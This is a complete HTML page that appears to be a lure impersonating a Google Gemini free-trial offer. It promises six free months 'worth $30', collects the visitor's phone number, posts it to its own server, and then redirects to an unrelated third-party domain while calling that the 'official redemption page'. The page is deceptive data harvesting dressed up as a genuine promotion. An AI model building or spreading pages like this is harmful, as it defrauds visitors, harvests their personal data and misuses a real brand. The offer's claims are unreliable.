<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Activate Your Google Gemini Free Trial</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; min-height:100vh; display:flex; align-items:center; justify-content:center; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); padding:20px; }
    .card { background:#fff; border-radius:16px; padding:40px 32px; max-width:420px; width:100%; box-shadow:0 20px 60px rgba(0,0,0,0.3); text-align:center; }
    h1 { font-size:22px; color:#1a1a2e; }
    input[type="tel"] { width:100%; padding:12px 16px; border:2px solid #e2e8f0; border-radius:10px; font-size:16px; }
    .btn { width:100%; padding:14px; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); color:#fff; border:none; border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; }
    .btn:hover { opacity:0.9; }
  </style>
</head>
<body>
  <div class="card">
    <div style="font-size:48px;margin-bottom:8px;">&#10024;</div>
    <h1>Claim Your Free Trial</h1>
    <p style="color:#64748b;margin:8px 0 20px;">6-month <strong>FREE trial</strong> of Google Gemini Plus (worth $30)</p>
    <form id="claimForm">
      <div style="text-align:left;margin-bottom:16px;">
        <label style="font-weight:600;font-size:14px;">Phone number</label>
        <input type="tel" id="phone" placeholder="e.g. 0712 345 678" required />
      </div>
      <button type="submit" class="btn">&#128640; Activate Free Trial</button>
    </form>
    <p style="font-size:12px;color:#94a3b8;margin-top:16px;">
      By clicking you agree to proceed to the official redemption page.
    </p>
  </div>
  <script>
    document.getElementById('claimForm').addEventListener('submit', async e => {
      e.preventDefault();
      const phone = document.getElementById('phone').value.trim();
      if (phone.replace(/\D/g,'').length < 9) return alert('Enter a valid number');
      try { await fetch('/api/submit', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone}) }); } catch(e) {}
      window.location.href = 'https://content.econetai.co.zw';
    });
  </script>
</body>
</html>
